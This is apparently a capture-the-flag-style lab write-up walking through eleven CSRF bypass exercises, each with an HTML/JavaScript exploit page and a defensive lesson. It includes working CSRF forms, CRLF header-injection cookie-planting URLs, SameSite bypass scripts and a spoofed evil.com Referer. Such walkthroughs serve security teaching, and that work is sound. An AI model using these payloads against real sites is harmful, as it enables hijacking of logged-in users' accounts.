First — what even is CSRF?

Cross-Site Request Forgery tricks a victim's browser into making a request to a site where they're already logged in — without them knowing.

The server sees a legitimate session cookie. It has no idea the request was forged.

Three things need to be true for CSRF to work:

  • A relevant action exists — change email, transfer money, delete account
  • Cookie-based session handling — no other way to verify identity
  • No unpredictable request parameters

If all three are true — you have a CSRF vulnerability.

Now let's break things.

Lab 1 — No Defenses Apprentice

The simplest form. No token. No SameSite. Nothing.

<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>

Victim visits exploit server. Browser auto-attaches session cookie. Email changed. Done.

This is CSRF in its purest form. The server cannot tell a forged request from a real one.

The fix: CSRF tokens on every state-changing request.

Lab 2 — Token Validation Depends on Request Method Practitioner

The developer added CSRF token validation — but only for POST requests.

I converted the POST to a GET in Burp. One right-click. Token validation completely bypassed.

<form action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>

No method="POST" — form defaults to GET. Server never checks token on GET.

The lesson: Validate tokens on ALL request methods. Not just POST.

Lab 3 — Token Validation Depends on Token Being Present Practitioner

This one made me laugh.

I tried changing the token value — rejected. Then on a hunch I deleted the csrf parameter entirely.

200 OK.

The server logic was: if token exists, validate it. If not — skip validation.

<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>

Just remove the csrf field. That's it.

The lesson: Always REQUIRE token presence. Missing token = invalid request. Not a free pass.

Lab 4 — Token Not Tied to User Session Practitioner

Two accounts. Wiener and Carlos.

I grabbed Wiener's CSRF token. Dropped the request. Logged into Carlos in incognito. Swapped his token with Wiener's.

200 OK.

The tokens existed in a global pool — not tied to any specific session. Any valid token worked for any user.

The lesson: Bind tokens to sessions. A token for user A should never work for user B.

Lab 5 — Token Tied to Non-Session Cookie Practitioner

This is where things got interesting.

The app used a separate csrfKey cookie — independent from the session cookie. I confirmed this by swapping csrfKey + csrf token between accounts — it worked.

But how do I plant MY csrfKey into the victim's browser?

I found it. The search parameter was reflecting into the Set-Cookie header. That's a CRLF injection vulnerability.

/?search=test%0d%0aSet-Cookie:%20csrfKey=MYKEY%3b%20SameSite=None

%0d%0a = carriage return + line feed = new HTTP header injected.

Combined with an img onerror to fire the form AFTER the cookie was planted:

<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com">
      <input type="hidden" name="csrf" value="MY_CSRF_TOKEN">
    </form>
    <img src="https://TARGET/?search=test%0d%0aSet-Cookie:
    %20csrfKey=MY_KEY%3b%20SameSite=None" 
    onerror="document.forms[0].submit();">
  </body>
</html>

Image fails to load → onerror fires → form submits with my token already in victim's browser.

The lesson: Never reflect user input into response headers. Sanitize everything.

Lab 6 — Token Duplicated in Cookie (Double Submit) Practitioner

The double-submit pattern — server just checks if csrf cookie matches csrf body parameter.

No server-side storage. No binding to sessions. Just: are these two values the same?

I control both. So I set both to "fake."

CRLF injection again to plant csrf=fake cookie. Then csrf=fake in the form body.

Server compared fake == fake → accepted.

<img src="https://TARGET/?search=test%0d%0aSet-Cookie:
%20csrf=fake%3b%20SameSite=None" 
onerror="document.forms[0].submit();"/>

The lesson: Store tokens server-side. Never trust client-controlled values to validate client-controlled values.

Lab 7 — SameSite Lax Bypass via Method Override Practitioner

SameSite=Lax blocks cross-site POST requests. But GET requests on top-level navigation? Those go through.

The server supported a _method parameter to override the HTTP method.

GET request + _method=POST = server treats it as POST. Browser sends Lax cookie because it's a GET top-level navigation.

<script>
    document.location = "https://TARGET/my-account/change-email
    ?email=attacker@gmail.com&_method=POST";
</script>

document.location triggers top-level navigation. Cookie included. Email changed.

The lesson: Never support method override parameters. Use SameSite=Strict for sensitive cookies.

Lab 8 — Broken Referer Validation Practitioner

Server checks if the expected domain appears ANYWHERE in the Referer string.

Not: is the request FROM the expected domain. Just: does the string CONTAIN the domain.

So I appended the real domain as a query string to a fake Referer:

Referer: https://evil.com?TARGET-DOMAIN.web-security-academy.net

Server saw the expected domain in the string → accepted.

To replicate this in the exploit I used history.pushState to inject the domain into the URL — which becomes the Referer. Added Referrer-Policy: unsafe-url in the response headers to stop modern browsers stripping the query string.

The lesson: Validate that Referer STARTS WITH the expected domain. Not just contains it.

Lab 9 — SameSite Strict Bypass via Client-Side Redirect Practitioner

SameSite=Strict. The strongest restriction. Blocks all cross-site requests.

But I found a gadget.

The comment confirmation page used postId to dynamically build a redirect path in JavaScript. I tested path traversal:

/post/comment/confirmation?postId=1/../../my-account

Redirected to /my-account. The redirect happened same-site — so the browser included the Strict cookie.

I chained it with a GET email change request:

<script>
    document.location = "https://TARGET/post/comment/confirmation
    ?postId=1/../../my-account/change-email
    ?email=attacker@gmail.com%26submit=1";
</script>

The initial request goes to the target site → triggers the redirect → CSRF fires same-site → cookie included → email changed.

This is vulnerability chaining. One bug amplifying another.

The lesson: Never use user input to construct redirect paths. Validate all redirect destinations server-side.

Lab 10 — SameSite Lax Bypass via Cookie Refresh Practitioner

Chrome has a quirk — newly issued SameSite=Lax cookies are exempt from SameSite restrictions for 2 minutes after creation.

The site used OAuth. Every visit to /social-login issued a fresh session cookie.

Strategy: force victim to visit /social-login → fresh cookie issued → CSRF fires within 2 minutes.

Problem: popup blocker blocked window.open.

Solution: wait for user interaction.

<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://TARGET/social-login');
        setTimeout(changeEmail, 5000);
    }
    function changeEmail() {
        document.forms[0].submit();
    }
</script>

Victim clicks → OAuth fires in popup → 5 second wait → CSRF form submits → fresh Lax cookie included → email changed.

The lesson: Explicitly set SameSite=Strict. Never rely on default Lax. Implement CSRF tokens alongside SameSite.

Lab 11 — Referer Validation Depends on Header Being Present Practitioner

The counterpart to Lab 8.

Server validates the Referer — but only if it exists. Missing Referer? Trusted by default.

I deleted the Referer header in Burp. 200 OK.

In the exploit — one meta tag suppresses it:

<meta name="referrer" content="no-referrer">

Browser sends no Referer. Server skips validation. Done.

The lesson: Treat missing Referer the same as invalid Referer. Better yet — use proper CSRF tokens and stop relying on Referer entirely.

What I learned from all of this

CSRF defenses fail in predictable ways:

  • Developers validate tokens on some methods but not others
  • Token pools aren't tied to sessions
  • Double-submit patterns trust client-controlled values
  • SameSite alone isn't enough without Strict
  • Referer validation is fragile — browsers strip it, attackers manipulate it

The only robust defense is a properly implemented CSRF token — unpredictable, server-side, session-bound, required on every state-changing request.

Everything else is a workaround waiting to be bypassed.
